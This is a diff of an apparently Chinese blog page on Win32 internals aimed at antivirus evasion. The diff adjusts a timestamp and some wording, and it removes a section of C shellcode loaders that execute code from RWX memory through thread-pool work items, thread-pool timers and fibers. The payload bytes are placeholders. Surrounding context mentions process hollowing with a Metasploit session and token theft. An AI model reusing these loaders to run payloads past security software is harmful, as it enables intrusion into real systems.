@@ -21,7 +21,7 @@
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320210500.jpg">
 <meta property="og:image" content="https://cdn.jsdelivr.net/gh/SnowMeteors/Resources@master/img/win32/20220320215932.jpg">
 <meta property="article:published_time" content="2022-04-27T11:12:07.000Z">
-<meta property="article:modified_time" content="2022-04-28T09:15:39.645Z">
+<meta property="article:modified_time" content="2022-04-29T06:00:34.561Z">
 <meta property="article:author" content="lam">
 <meta property="article:tag" content="免杀">
 <meta name="twitter:card" content="summary">
@@ -400,9 +400,9 @@ int main()
 &#125;
 
 </code></pre>
-<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="什么是进程"><a href="#什么是进程" class="headerlink" title="什么是进程"></a>什么是进程</h4><p>　　进程是程序的实体，是资源分配的最小单位。进程是一种空间上的概念，它的责任就是提供资源。每一个进程都有一个4GB大小的虚拟空间，范围从0x0-0xFFFFFFFF。其中内核占高2GB，低2GB给程序的堆栈使用</p>
-<p>　　在Windows中，系统通过句柄管理进程中的资源，句柄存储在内核空间中的一个全局句柄表中，而每个进程也都有一个句柄表，这个句柄表是私有的。</p>
-<p>　　<strong>PID</strong> 是指的是全局句柄表的值。</p>
+<h3 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h3><h4 id="什么是进程"><a href="#什么是进程" class="headerlink" title="什么是进程"></a>什么是进程</h4><p>　　进程是程序的实例，资源分配的最小单位。进程是一种空间上的概念，它的责任就是提供资源。每一个进程都有一个4GB大小的虚拟空间，范围从0x0-0xFFFFFFFF。其中内核占高2GB，低2GB给程序的堆栈使用</p>
+<p>　　在Windows中，系统通过句柄管理进程中的资源，句柄存储在内核空间中的一个全局句柄表中，而每个进程也都有一个句柄表，句柄表是私有的。</p>
+<p>　　<strong>PID</strong> 是指的是全局句柄表的值，可以通过资源管理器查看。</p>
 <h4 id="进程执行的加载过程"><a href="#进程执行的加载过程" class="headerlink" title="进程执行的加载过程"></a>进程执行的加载过程</h4><p>　　1.映射EXE文件（低2G）<br>　　2.创建内核对象EPROCESS（高2G）<br>　　3.映射系统DLL（ntdll.dll）<br>　　4.创建线程内核对象ETHREAD<br>　　5.系统启动线程<br>　　　　a.映射DLL(ntdll.LdrInitalizeThunk)<br>　　　　b.线程开始执行</p>
 <h4 id="创建进程"><a href="#创建进程" class="headerlink" title="创建进程"></a>创建进程</h4><p>　　任何进程都是别的进程创建的，当用户双击exe时，实际上是Explorer.exe这个进程所创建的，使用了CreateProcess函数</p>
 <pre><code class="c">BOOL CreateProcess(
@@ -3116,82 +3116,6 @@ int main()
 &#125;
 </code></pre>
 <p> 运行后，msf上线，notepad已成为傀儡进程 </p>
-<h4 id="线程池"><a href="#线程池" class="headerlink" title="线程池"></a>线程池</h4><p>　　这里就只写两种，<a target="_blank" rel="noopener" href="https://www.ired.team/offensive-security/code-injection-process-injection/shellcode-execution-via-createthreadpoolwait">代码灵感来源</a>。我看好多网上都写的这种方法。</p>
-<p>　　后来花了几个小时，学了线程池，于是发现有很多很多方法去执行shellcode。希望大家多多思考吧。</p>
-<p>　　线程池的方式让我们不再使用<code>CreateThread</code>，更多的线程池<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-pool-api">api</a>。这些线程池api都可以替代<code>CreateThread</code></p>
-<p>　　<strong>第一种</strong>，创建工作项</p>
-<pre><code class="c">#include &lt;stdio.h&gt;
-#include &lt;Windows.h&gt;
-
-int main()
-&#123;
-    unsigned char shellcode[] = &quot;\x55\x64&quot;;
-
-    // 获取大小
-    int size = sizeof(shellcode);
-    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(lpAddress, shellcode, size);
-    
-    // 创建一个线程池工作项
-    PTP_WORK pwk = CreateThreadpoolWork(lpAddress, NULL, NULL);
-    SubmitThreadpoolWork(pwk);
-    WaitForThreadpoolWorkCallbacks(pwk, FALSE);
-    CloseThreadpoolWork(pwk);
-    return 0;
-&#125;
-</code></pre>
-<p>　　<strong>第二种</strong>，定时器</p>
-<pre><code class="c">#include &lt;stdio.h&gt;
-#include &lt;Windows.h&gt;
-
-int main()
-&#123;
-    unsigned char shellcode[] =&quot;\x55\x64&quot;;
-
-    // 获取大小
-    int size = sizeof(shellcode);
-    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(lpAddress, shellcode, size);
-    
-    PTP_TIMER pti = CreateThreadpoolTimer(lpAddress, NULL, NULL);
-
-    ULARGE_INTEGER ulRelativeTimer;
-    ulRelativeTimer.QuadPart = (LONGLONG)-(10000000);
-    FILETIME ftRelativeTimer;
-    ftRelativeTimer.dwHighDateTime = ulRelativeTimer.HighPart;
-    ftRelativeTimer.dwLowDateTime = ulRelativeTimer.LowPart;
-    SetThreadpoolTimer(pti, &amp;ftRelativeTimer, 0, 0);
-
-    Sleep(2000);
-    CloseThreadpoolTimer(pti);
-    return 0;
-&#125;
-</code></pre>
-<h4 id="纤程"><a href="#纤程" class="headerlink" title="纤程"></a>纤程</h4><p>　　<a target="_blank" rel="noopener" href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers">纤程</a>官方解释，简单来说线程是进程内部的实体，那么纤程则又是纤程内部的实体。</p>
-<p>　　使用纤程的步骤<br>　　1.使用<code>ConvertThreadToFiber </code>将主线程转换成纤程，这是必须的一步<br>　　2.使用<code>CreateFiber</code>创建一个纤程，并指向shellcode地址<br>　　3.最后使用<code>SwitchToFiber</code>，运行前面我们创建的纤程</p>
-<p>　　示例代码</p>
-<pre><code class="c">#include &lt;stdio.h&gt;
-#include &lt;Windows.h&gt;
-
-int main()
-&#123;
-    // 执行计算器的shellcode
-    unsigned char shellcode[] = &quot;&quot;;
-
-    // 获取大小
-    int size = sizeof(shellcode);
-    
-    LPVOID lpAddress = VirtualAlloc(NULL, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-    memcpy(lpAddress, shellcode, size);
-    // 将线程转换成纤程
-    ConvertThreadToFiber(NULL);
-    // 创建一个新的纤程
-    PVOID fiber = CreateFiber(0, lpAddress, NULL);
-    // 执行纤程
-    SwitchToFiber(fiber);
-    return 0;
-&#125;
-</code></pre>
 <h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>　　提权顾名思义就是提升自己的权限，不论是从administrator提升到system，还是普通用户提示到administrator都算提权。</p>
 <h4 id="令牌窃取"><a href="#令牌窃取" class="headerlink" title="令牌窃取"></a>令牌窃取</h4><p>　　令牌窃取与伪造，英文名:Token Impersonation&#x2F;Theft。这里不讲令牌的详细知识。说一下主令牌(primary token)和模拟令牌(impersonation token)的区别。</p>
 <p>　　主令牌应该叫进程令牌，模拟令牌应该叫线程令牌。主令牌只能附加给进程，模拟令牌只能附加给线程。换言之，如果使用主令牌，必须启动一个新的进程。而想在当前进程获取一个高权限，可以使用模拟令牌，将其附加给一个新的线程。</p>
@@ -4269,7 +4193,7 @@ else
 CloseServiceHandle(hSvc);
 CloseServiceHandle(hSCM);
 </code></pre>
-<h5 id="服务状态-1"><a href="#服务状态-1" class="headerlink" title="服务状态"></a>服务状态</h5><p>　　启动服务<code>StartService</code></p>
+<h5 id="服务状态-1"><a href="#服务状态-1" class="headerlink" title="服务状态"></a>服务状态</h5><p>　　启动服务</p>
 <pre><code class="c">BOOL StartService(
     SC_HANDLE hService,				// 服务句柄
     DWORD     dwNumServiceArgs,		// 启动参数的个数
